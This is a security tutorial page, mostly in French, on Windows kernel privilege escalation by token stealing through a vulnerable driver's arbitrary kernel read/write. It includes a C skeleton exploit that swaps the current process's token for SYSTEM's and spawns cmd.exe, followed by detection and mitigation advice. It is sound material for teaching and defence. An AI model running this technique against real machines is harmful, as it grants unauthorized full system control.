# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Vue d'ensemble

Si un driver vulnérable expose un IOCTL qui donne à un attaquant des primitives de lecture et/ou d'écriture arbitraires dans le kernel, l'élévation vers NT AUTHORITY\SYSTEM peut souvent être obtenue en volant un token SYSTEM. La technique copie le pointeur Token depuis l'EPROCESS d'un processus SYSTEM dans l'EPROCESS du processus courant.

Pourquoi ça marche :
- Chaque processus possède une structure EPROCESS qui contient (parmi d'autres champs) un Token (en réalité un EX_FAST_REF vers un objet token).
- Le processus SYSTEM (PID 4) détient un token avec tous les privilèges activés.
- Remplacer l'EPROCESS.Token du processus courant par le pointeur du token SYSTEM fait que le processus courant s'exécute immédiatement en tant que SYSTEM.

> Les offsets dans EPROCESS varient selon les versions de Windows. Déterminez-les dynamiquement (symbols) ou utilisez des constantes spécifiques à la version. Souvenez-vous aussi que EPROCESS.Token est un EX_FAST_REF (les 3 bits de poids faible sont des flags de comptage de références).

## Étapes générales

1) Localisez la base de ntoskrnl.exe et résolvez l'adresse de PsInitialSystemProcess.
- Depuis l'user mode, utilisez NtQuerySystemInformation(SystemModuleInformation) ou EnumDeviceDrivers pour obtenir les bases des drivers chargés.
- Ajoutez l'offset de PsInitialSystemProcess (depuis les symbols / reverse) à la base du kernel pour obtenir son adresse.
2) Lisez le pointeur à PsInitialSystemProcess → c'est un pointeur kernel vers l'EPROCESS de SYSTEM.
3) Depuis l'EPROCESS de SYSTEM, lisez les offsets UniqueProcessId et ActiveProcessLinks pour parcourir la liste doublement chaînée des structures EPROCESS (ActiveProcessLinks.Flink/Blink) jusqu'à trouver l'EPROCESS dont UniqueProcessId égale GetCurrentProcessId(). Conservez les deux :
- EPROCESS_SYSTEM (pour SYSTEM)
- EPROCESS_SELF (pour le processus courant)
4) Lisez la valeur du token SYSTEM : Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Masquez les 3 bits de poids faible : Token_SYS_masked = Token_SYS & ~0xF (communément ~0xF ou ~0x7 selon le build ; sur x64 les 3 bits de poids faible sont utilisés — masque 0xFFFFFFFFFFFFFFF8).
5) Option A (courante) : préservez les 3 bits de poids faible de votre token actuel et greffez-les sur le pointeur SYSTEM pour garder le comptage de références interne cohérent.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Écrivez Token_NEW dans (EPROCESS_SELF + TokenOffset) en utilisant votre primitive d'écriture kernel.
7) Votre processus courant est maintenant SYSTEM. Facultatif : lancez un nouveau cmd.exe ou powershell.exe pour vérifier.

## Pseudo-code

Below is a skeleton that only uses two IOCTLs from a vulnerable driver, one for 8-byte kernel read and one for 8-byte kernel write. Replace with your driver’s interface.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Remarques :
- Offsets : Utilisez WinDbg’s `dt nt!_EPROCESS` avec les PDBs de la cible, ou un runtime symbol loader, pour obtenir les offsets corrects. Ne hardcodez pas aveuglément.
- Masque : Sur x64 le token est un EX_FAST_REF ; les 3 bits bas sont des bits de reference count. Conserver les bits bas originaux de votre token évite des incohérences immédiates du refcount.
- Stabilité : Préférez élever le processus courant ; si vous élevez un helper de courte durée vous risquez de perdre SYSTEM quand il se termine.

## Détection & mitigation
- Le chargement de drivers tiers non signés ou non fiables qui exposent des IOCTLs puissants est la cause racine.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard, et les règles Attack Surface Reduction peuvent empêcher le chargement de drivers vulnérables.
- EDR peut surveiller des séquences IOCTL suspectes qui implémentent arbitrary read/write et les token swaps.

## References
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
